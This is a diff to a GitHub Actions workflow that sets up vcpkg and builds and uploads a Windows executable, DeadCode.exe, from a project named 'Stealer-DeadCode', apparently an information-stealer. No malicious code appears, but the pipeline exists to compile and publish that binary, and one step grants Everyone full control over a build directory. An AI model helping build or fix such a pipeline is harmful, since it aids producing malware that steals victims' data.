@@ -152,11 +152,15 @@ jobs:
         restore-keys: |
           vcpkg-
 
-    - name: Install vcpkg and dependencies
+    - name: Update vcpkg
       run: |
         if (-not (Test-Path C:/vcpkg)) {
           Write-Host "Cloning vcpkg..."
           git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
+        } else {
+          Write-Host "vcpkg directory already exists, updating..."
+          cd C:/vcpkg
+          git pull
         }
         Write-Host "Running bootstrap-vcpkg..."
         & C:/vcpkg/bootstrap-vcpkg.bat -disableMetrics
@@ -164,16 +168,29 @@ jobs:
           Write-Host "Error: Bootstrap failed. Check the logs."
           exit 1
         }
+        Write-Host "vcpkg version after bootstrap:"
+        & C:/vcpkg/vcpkg.exe --version
+      shell: pwsh
+
+    - name: Ensure write permissions for vcpkg build directory
+      run: |
+        Write-Host "Ensuring write permissions for vcpkg build directory..."
+        New-Item -Path "C:/vcpkg/buildtrees" -ItemType Directory -Force
+        icacls "C:\vcpkg\buildtrees" /grant "Everyone:F" /T
+      shell: pwsh
+
+    - name: Install vcpkg dependencies
+      env:
+        VCPKG_MAX_CONCURRENCY: 1  # Отключаем параллельную сборку
+      run: |
+        Write-Host "Installing vcpkg dependencies with triplet x64-mingw-static..."
         $vcpkgExe = "C:/vcpkg/vcpkg.exe"
         $env:Path += ";C:/vcpkg"
         [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
-        Write-Host "vcpkg version after bootstrap:"
-        & $vcpkgExe --version
-        Write-Host "Installing vcpkg dependencies with triplet x64-mingw-static..."
-        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl openssl --triplet x64-mingw-static --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
+        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl openssl --triplet x64-mingw-static --clean-after-build --debug 2>&1 | Tee-Object -FilePath "Stealer-DeadCode/vcpkg_install.log"
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: vcpkg install failed. Check vcpkg_install.log for details."
-          Get-Content vcpkg_install.log
+          Get-Content Stealer-DeadCode/vcpkg_install.log
           exit 1
         }
         Write-Host "vcpkg installation completed successfully"
@@ -311,6 +328,13 @@ jobs:
           Get-Content ../make_output.log
           exit 1
         }
+        
+        # Проверяем, создан ли DeadCode.exe
+        if (-not (Test-Path release/DeadCode.exe)) {
+          Write-Host "Error: DeadCode.exe was not generated"
+          dir release
+          exit 1
+        }
         Write-Host "Build completed successfully"
       shell: pwsh
 
@@ -330,7 +354,7 @@ jobs:
       uses: actions/upload-artifact@v4
       with:
         name: DeadCode-Build
-        path: Stealer-DeadCode/build/DeadCode.exe
+        path: Stealer-DeadCode/build/release/DeadCode.exe
         if-no-files-found: error
 
     - name: Cleanup
